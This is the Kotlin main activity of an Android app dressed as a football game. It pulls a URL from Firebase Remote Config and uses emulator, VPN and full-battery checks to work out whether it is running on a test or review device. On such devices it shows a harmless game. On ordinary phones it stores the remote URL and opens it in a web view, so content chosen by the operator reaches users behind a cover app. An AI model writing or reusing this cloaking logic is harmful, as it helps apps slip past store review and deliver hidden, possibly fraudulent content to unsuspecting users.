package aafun.gamesfootbal

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import androidx.appcompat.app.AlertDialog
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import java.util.*

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val sharedPreferences = this.getSharedPreferences("localData", Context.MODE_PRIVATE)
        if(sharedPreferences.getString("url","")?.isNotEmpty() == true){
            if (isOnline(this)) {
                nextActivity(WebActivity::class.java, sharedPreferences.getString("url", "")!!)
            }else{
                errorDialog("The app needs an internet connection to work.")
            }
        }else{
            if (isOnline(this)) {
                try {
                    val firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                    val remoteConfigSettings = FirebaseRemoteConfigSettings
                        .Builder()
                        .setMinimumFetchIntervalInSeconds(3600)
                        .build()
                    firebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_default)
                    firebaseRemoteConfig.setConfigSettingsAsync(remoteConfigSettings);
                    firebaseRemoteConfig.fetchAndActivate().addOnCompleteListener {
                        if (it.isSuccessful) {
                            val find = firebaseRemoteConfig.getString("url")
                            val to = firebaseRemoteConfig.getBoolean("to")
                            if(to) {
                                if (find != "") {
                                    if (sharedPreferences.getString("url", "").equals("")) {
                                        if (checkIsEmu() || isBatteryLevelInRange() || vpnActive())
                                            nextActivity(GameActivity::class.java, find)
                                        else {
                                            sharedPreferences.edit().putString("url", find).apply()
                                            nextActivity(WebActivity::class.java, find)
                                        }
                                    } else nextActivity(WebActivity::class.java, find)
                                } else nextActivity(GameActivity::class.java, "")
                            }else{
                                if (find != "") {
                                    if (sharedPreferences.getString("url", "").equals("")) {
                                        if (checkIsEmu() || isBatteryLevelInRange())
                                            nextActivity(GameActivity::class.java, find)
                                        else {
                                            sharedPreferences.edit().putString("url", find).apply()
                                            nextActivity(WebActivity::class.java, find)
                                        }
                                    } else nextActivity(WebActivity::class.java, find)
                                } else nextActivity(GameActivity::class.java, "")
                            }
                        }
                    }
                } catch (e: Exception) {
                    errorDialog(e.message.toString())
                }
            }
            else errorDialog("The app needs an internet connection to work.")
        }
    }
    private fun nextActivity(activity: Class<*>, url: String="") {
        val intent = Intent(this, activity)
        intent.putExtra("url", url)
        startActivity(intent)
        finish()
    }

    private fun errorDialog(message: String) {
        val dialogBuilder: AlertDialog.Builder = AlertDialog.Builder(this)
        dialogBuilder.setIcon(android.R.drawable.stat_notify_error)
        dialogBuilder.setTitle("Error!!!" as CharSequence)
        dialogBuilder.setMessage(message as CharSequence)
        dialogBuilder.setPositiveButton("Ok") { dialog, _ -> dialog.dismiss() }
        dialogBuilder.create().show()
    }

    private fun isOnline(context: Context): Boolean {
        val systemService: Any = context.getSystemService(CONNECTIVITY_SERVICE)
        return (systemService as ConnectivityManager).activeNetworkInfo != null
    }

    private fun isBatteryLevelInRange():Boolean{
        val bm: BatteryManager = this.getSystemService(BATTERY_SERVICE) as BatteryManager
        val batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        return(1<=batLevel)&&(99<=batLevel)
    }
    private fun vpnActive():Boolean{
        if(Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false
        var vpnInUse = false
        val cm = this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
            val activeNetwork = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(activeNetwork)
            return caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ?: false
        }
        val networks = cm.allNetworks
        for(network in networks){
            val caps = cm.getNetworkCapabilities(network)
            if(caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true){
                vpnInUse = true
                break
            }
        }
        return vpnInUse
    }

    private fun checkIsEmu(): Boolean {
        //if (BuildConfig.DEBUG) return false
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND
        return ((Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion"))
                || buildHardware == "goldfish"
                || brand.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox")) || brand.startsWith("generic")
                && Build.DEVICE.startsWith("generic")
    }
}